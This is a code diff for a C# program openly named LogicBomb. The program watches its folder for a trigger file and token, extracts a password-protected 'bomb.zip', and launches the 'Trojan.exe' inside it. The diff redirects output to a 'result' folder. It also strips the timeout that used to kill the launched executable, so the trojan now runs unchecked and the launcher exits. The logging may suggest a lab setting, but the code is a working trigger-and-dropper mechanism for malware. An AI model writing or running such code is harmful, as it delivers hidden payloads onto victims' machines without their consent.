@@ -6,20 +6,21 @@ using System.IO;
 using System.Linq;
 using System.Threading;
 using System.Threading.Tasks;
-using Ionic.Zip; 
+using Ionic.Zip;
 
 namespace LogicBomb
 {
     internal class Program
     {
         private static readonly string ExecutableBaseDir = AppDomain.CurrentDomain.BaseDirectory;
+        private static readonly string ResultDir = Path.Combine(ExecutableBaseDir, "result");
+
         private const string TriggerName = "trigger.flag";
         private const string RequiredToken = "ALLOW_TRIGGER";
         private const string MarkerName = "activated.txt";
 
         private const int DebounceMs = 1000;
         private const int FileReadyTimeoutSec = 5;
-        private const int ExecTimeoutMs = 5000;
 
         private static FileSystemWatcher watcher;
         private static ConcurrentDictionary<string, DateTime> pending = new ConcurrentDictionary<string, DateTime>(StringComparer.OrdinalIgnoreCase);
@@ -29,9 +30,12 @@ namespace LogicBomb
         static void Main(string[] args)
         {
             Console.WriteLine("[LogicBomb] START (Simplified Mode) - Press Ctrl+C to stop");
-            logFile = Path.Combine(ExecutableBaseDir, "logicbomb_simplified_log.jsonl");
 
-            watcher = new FileSystemWatcher(ExecutableBaseDir) 
+            // ✅ Ensure result directory exists
+            Directory.CreateDirectory(ResultDir);
+            logFile = Path.Combine(ResultDir, "logicbomb_simplified_log.jsonl");
+
+            watcher = new FileSystemWatcher(ExecutableBaseDir)
             {
                 NotifyFilter = NotifyFilters.FileName | NotifyFilters.LastWrite | NotifyFilters.CreationTime | NotifyFilters.Size,
                 Filter = "*.*",
@@ -149,15 +153,13 @@ namespace LogicBomb
                     return;
                 }
 
-                
-                string markerPath = Path.Combine(ExecutableBaseDir, MarkerName);
-                File.WriteAllText(markerPath, $"(SIMPLIFIED) Activated by {TriggerName} at {DateTime.Now:yyyy-MM-dd HH:mm:ss}\r\n");
+                // ✅ Marker file inside "result"
+                string markerPath = Path.Combine(ResultDir, MarkerName);
+                File.WriteAllText(markerPath, $"Activated by {TriggerName} at {DateTime.Now:yyyy-MM-dd HH:mm:ss}\r\n");
                 Console.WriteLine("[LogicBomb] Creating marker: " + markerPath);
 
                 string bombZipPath = Path.Combine(ExecutableBaseDir, "bomb.zip");
-                
-                string extractionDir = ExecutableBaseDir;
-
+                string extractionDir = ResultDir;
                 string executableToRun = null;
 
                 if (File.Exists(bombZipPath))
@@ -167,8 +169,7 @@ namespace LogicBomb
                         Console.WriteLine($"[LogicBomb] Found bomb.zip at: {bombZipPath}");
                         using (ZipFile zip = ZipFile.Read(bombZipPath))
                         {
-                            zip.Password = "123"; 
-                            
+                            zip.Password = "123";
                             foreach (ZipEntry e in zip)
                             {
                                 e.Extract(extractionDir, ExtractExistingFileAction.OverwriteSilently);
@@ -177,13 +178,12 @@ namespace LogicBomb
                         Console.WriteLine($"[LogicBomb] Extracted bomb.zip to {extractionDir} with password '123'.");
                         LogEvent("extracted", bombZipPath, "extracted_to", extractionDir);
 
-                        
                         executableToRun = Path.Combine(extractionDir, "Trojan.exe");
                         if (!File.Exists(executableToRun))
                         {
-                            Console.WriteLine($"[LogicBomb] Trojan.exe not found directly in executable's directory after extraction: {executableToRun}");
+                            Console.WriteLine($"[LogicBomb] Trojan.exe not found after extraction: {executableToRun}");
                             LogEvent("error", extractionDir, "Trojan_exe_not_found", null);
-                            executableToRun = null; 
+                            executableToRun = null;
                         }
                     }
                     catch (Ionic.Zip.BadPasswordException)
@@ -201,35 +201,27 @@ namespace LogicBomb
                 }
                 else
                 {
-                    Console.WriteLine($"[LogicBomb] bomb.zip not found in program's directory: {bombZipPath}. Skipping extraction and execution of internal exe.");
+                    Console.WriteLine($"[LogicBomb] bomb.zip not found in program directory. Skipping extraction.");
                     LogEvent("info", fullPath, "no_bomb_zip", null);
                 }
 
                 if (executableToRun != null)
                 {
-                    Console.WriteLine("[LogicBomb] Preconditions OK -> launching: " + executableToRun);
-
+                    Console.WriteLine("[LogicBomb] Launching: " + executableToRun);
                     var psi = new ProcessStartInfo
                     {
                         FileName = executableToRun,
-                        WorkingDirectory = extractionDir, 
+                        WorkingDirectory = extractionDir,
                         UseShellExecute = true,
                         CreateNoWindow = false
                     };
+
                     try
                     {
-                        using (var proc = Process.Start(psi))
-                        {
-                            if (proc != null)
-                            {
-                                if (!proc.WaitForExit(ExecTimeoutMs))
-                                {
-                                    Console.WriteLine("[LogicBomb] Executable did not finish within timeout; attempting to kill.");
-                                    try { proc.Kill(); } catch { /* best-effort */ }
-                                }
-                            }
-                        }
+                        Process.Start(psi);
                         LogEvent("launched", executableToRun, "launched", null);
+                        Console.WriteLine("[LogicBomb] Executable started. Exiting main app.");
+                        Environment.Exit(0); // ✅ Immediately exit after launch
                     }
                     catch (Exception ex)
                     {
